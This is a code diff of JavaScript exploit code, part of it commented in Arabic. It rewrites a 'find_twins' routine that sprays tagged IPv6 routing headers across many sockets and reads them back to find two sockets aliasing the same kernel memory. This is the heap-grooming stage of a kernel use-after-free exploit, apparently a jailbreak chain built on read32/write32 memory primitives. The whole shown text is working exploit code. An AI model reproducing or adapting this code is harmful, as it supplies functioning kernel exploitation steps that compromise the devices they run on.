@@ -775,86 +775,73 @@ function fill_buffer_64(buf, val, len) {
   }
 }
 function find_twins() {
-  // -----------------------------
-  //  INITIAL STATE
-  // -----------------------------
+  var count = 0;
+  var val, i, j;
+  var zeroMemoryCount = 0;
+
   twins[0] = -1;
   twins[1] = -1;
 
-  const tag_buf = leak_rthdr;     // buffer used for reading
-  const tag_len = malloc(4);      // length pointer (like Lua)
-  const sock_count = ipv6_socks.length;
+  var spray_add = spray_rthdr.add(0x04);
+  var leak_add  = leak_rthdr.add(0x04);
 
-  let round = 0;
+  while (count < MAX_ROUNDS_TWIN) {
 
-  // -----------------------------
-  //  MAIN LOOP
-  // -----------------------------
-  while (round < max_rounds) {
+    // مراقبة حالة الذاكرة (نفس الاسماء)
+    if (typeof debugging !== 'undefined' &&
+        debugging.info &&
+        debugging.info.memory &&
+        debugging.info.memory.available === 0) {
 
-    // -----------------------------
-    //  PHASE 1 — SPRAY TAGS
-    // -----------------------------
-    for (let i = 0; i < sock_count; i++) {
-      const sd = ipv6_socks[i];
-      if (sd.eq(BigInt_Error)) continue;
-
-      // write tag
-      write32(spray_add, RTHDR_TAG | i);
-
-      // apply header
-      const ret = set_rthdr(sd, spray_rthdr, spray_rthdr_len);
-      if (ret < 0) continue;
+      zeroMemoryCount++;
+      if (zeroMemoryCount >= 5) {
+        cleanup();
+        return false;
+      }
+    } else {
+      zeroMemoryCount = 0;
     }
 
-    // -----------------------------
-    //  PHASE 2 — LEAK + MATCH
-    // -----------------------------
-    for (let i = 0; i < sock_count; i++) {
-      const sd = ipv6_socks[i];
-      if (sd.eq(BigInt_Error)) continue;
+    // المرحلة الأولى: الكتابة + set_rthdr
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      // request read length (like Lua)
-      write32(tag_len, 8);
+      write32(spray_add, RTHDR_TAG | i);
+      read32(spray_add); // memory barrier كما كانت
 
-      const ret = get_rthdr(sd, tag_buf, tag_len);
-      if (ret < 0) continue;
+      set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
+    }
 
-      // read tag
-      const val = read32(tag_buf.add(4));
-      const j = val & 0xFFFF;
+    // المرحلة الثانية: leak + البحث عن التوأم
+    for (i = 0; i < ipv6_socks.length; i++) {
+      if (ipv6_socks[i].eq(BigInt_Error)) continue;
 
-      // match conditions (pure logic)
-      const tag_ok = (val & 0xFFFF0000) === RTHDR_TAG;
-      const index_ok = j >= 0 && j < sock_count;
-      const not_self = i !== j;
+      write32(leak_add, 0);
+      get_rthdr(ipv6_socks[i], leak_rthdr, 8);
 
-      if (tag_ok && index_ok && not_self) {
+      val = read32(leak_add);
+      j   = val & 0xFFFF;
+
+      if ((val & 0xFFFF0000) === RTHDR_TAG &&
+          i !== j &&
+          j >= 0 &&
+          j < ipv6_socks.length) {
+
         twins[0] = i;
         twins[1] = j;
-        log(`TWINS : [${i}] [${j}]`);
+        log(' TWINS : [' + i + '] [' + j + ']');
         return true;
       }
     }
 
-    // -----------------------------
-    //  OPTIONAL YIELD (STRUCTURE ONLY)
-    // -----------------------------
-    if (round % 50 === 0) {
-      // placeholder for scheduling/yield
-      // (you fill this depending on your environment)
-    }
-
-    round++;
+    count++;
   }
 
-  // -----------------------------
-  //  FAIL EXIT
-  // -----------------------------
   twins[0] = -1;
   twins[1] = -1;
   return false;
 }
+
 function find_triplet(master, other, iterations) {
   if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
   var count = 0;
